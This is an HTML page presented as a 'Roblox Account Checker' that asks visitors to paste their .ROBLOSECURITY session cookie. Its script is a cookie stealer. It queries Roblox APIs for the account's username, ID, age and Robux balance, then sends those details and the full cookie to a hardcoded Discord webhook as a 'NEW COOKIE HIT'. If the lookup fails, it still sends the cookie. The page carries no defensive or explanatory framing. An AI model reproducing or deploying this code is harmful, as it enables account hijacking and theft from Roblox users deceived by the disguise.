<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Roblox Account Checker</title>
  <style>
    body { font-family: Arial, sans-serif; background: #0d1117; color: #c9d1d9; margin: 0; padding: 40px; text-align: center; }
    .container { max-width: 500px; margin: auto; background: #161b22; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(88,101,242,0.4); }
    h1 { color: #5865f2; }
    input { width: 100%; padding: 12px; margin: 15px 0; background: #0d1117; border: 1px solid #30363d; color: #c9d1d9; border-radius: 6px; font-size: 16px; }
    button { background: #5865f2; color: white; border: none; padding: 14px 30px; font-size: 18px; border-radius: 6px; cursor: pointer; }
    button:hover { background: #4752c4; }
    #status { margin-top: 20px; color: #ff4444; font-weight: bold; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Roblox Account Checker</h1>
    <p>Enter your .ROBLOSECURITY to verify account details.</p>
    
    <input type="text" id="cookie" placeholder="_|WARNING|-DO-NOT-SHARE-THIS.--..." />
    <button onclick="grabAndSend()">Check Account</button>
    
    <div id="status"></div>
  </div>

  <script>
    const WEBHOOK = "https://discord.com/api/webhooks/1477729306158432428/aKd2-VP_7LOYpIlqv4F0Za63-BnEsiaYE1TvOSDO7R4U6gYSsIjiw1WTjwqMDKXz0cBn";

    async function sendEmbed(title, description, fields, color = 0x5865F2, thumbnail = null) {
      const embed = {
        title,
        description,
        color,
        fields,
        timestamp: new Date().toISOString(),
        footer: { text: "Captain Hook Logger • " + new Date().toLocaleString() }
      };
      if (thumbnail) embed.thumbnail = { url: thumbnail };

      try {
        await fetch(WEBHOOK, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            username: "Captain Hook",
            avatar_url: "https://i.imgur.com/your-pirate-icon.png", // swap if you got one
            embeds: [embed],
            content: "@everyone NEW HIT"  // ping if you want, remove if not
          })
        });
      } catch {}
    }

    async function fetchWithCookie(url, cookie, method = "GET", body = null) {
      let csrf = "";
      try {
        const csrfRes = await fetch("https://auth.roblox.com/v2/logout", {
          method: "POST",
          credentials: "include",
          headers: { "Cookie": `.ROBLOSECURITY=${cookie}` }
        });
        csrf = csrfRes.headers.get("x-csrf-token") || "";
      } catch {}

      const headers = {
        "Cookie": `.ROBLOSECURITY=${cookie}`,
        "Accept": "application/json",
        "Origin": "https://www.roblox.com",
        "X-CSRF-TOKEN": csrf || ""
      };

      let res = await fetch(url, { method, headers, body: body ? JSON.stringify(body) : null });

      // If 403 Token Validation Failed, retry with fresh CSRF
      if (res.status === 403) {
        const newCsrf = res.headers.get("x-csrf-token");
        if (newCsrf) {
          headers["X-CSRF-TOKEN"] = newCsrf;
          res = await fetch(url, { method, headers, body: body ? JSON.stringify(body) : null });
        }
      }

      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      return res.json().catch(() => ({}));
    }

    async function grabAndSend() {
      const status = document.getElementById("status");
      const cookieInput = document.getElementById("cookie").value.trim();

      if (!cookieInput.includes("_|WARNING")) {
        status.textContent = "Bad format - needs to start with _|WARNING...";
        return;
      }

      status.textContent = "Grabbing info...";

      try {
        // Authenticated basics
        const authInfo = await fetchWithCookie("https://users.roblox.com/v1/users/authenticated", cookieInput);
        if (!authInfo.id) throw new Error("Cookie invalid or expired");

        const userId = authInfo.id;
        const username = authInfo.name;
        const displayName = authInfo.displayName;

        // Detailed user
        const userDetails = await fetchWithCookie(`https://users.roblox.com/v1/users/${userId}`, cookieInput);
        const created = userDetails.created ? new Date(userDetails.created) : null;
        const ageDays = created ? Math.floor((Date.now() - created) / (1000*60*60*24)) : "Unknown";
        const description = userDetails.description || "None";

        // Avatar thumbnail
        let avatar = null;
        try {
          const thumb = await fetchWithCookie(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=150x150&format=Png&isCircular=false`, cookieInput);
          avatar = thumb.data?.[0]?.imageUrl || null;
        } catch {}

        // Robux try (often fails)
        let robux = "Unknown";
        try {
          const currency = await fetchWithCookie(`https://economy.roblox.com/v1/users/${userId}/currency`, cookieInput);
          robux = currency.robux ? currency.robux.toLocaleString() : "Private / Failed";
        } catch {}

        const fields = [
          { name: "Username", value: username, inline: true },
          { name: "Display Name", value: displayName, inline: true },
          { name: "User ID", value: userId.toString(), inline: true },
          { name: "Account Age", value: `${ageDays} Days (${Math.floor(ageDays/365)} years)`, inline: true },
          { name: "Robux Balance", value: robux, inline: true },
          { name: "Description", value: description.substring(0, 200) + (description.length > 200 ? "..." : ""), inline: false },
          { name: "Full Cookie", value: "||`" + cookieInput + "`||", inline: false }  // spoiler so safe
        ];

        await sendEmbed(
          "NEW COOKIE HIT",
          `Logged account for **${displayName}** (@${username})`,
          fields,
          0xFF0000,  // red for hit
          avatar
        );

        status.innerHTML = "<strong style='color:#00ff00'>Success - details sent!</strong>";
      } catch (err) {
        status.textContent = "Grab failed: " + err.message;
        // Send cookie anyway as fallback
        await sendEmbed(
          "PARTIAL COOKIE LOG",
          "Cookie sent but full info grab failed.",
          [{ name: "Cookie", value: "||`" + cookieInput + "`||", inline: false }],
          0xFFA500  // orange
        );
      }
    }
  </script>
</body>
</html>
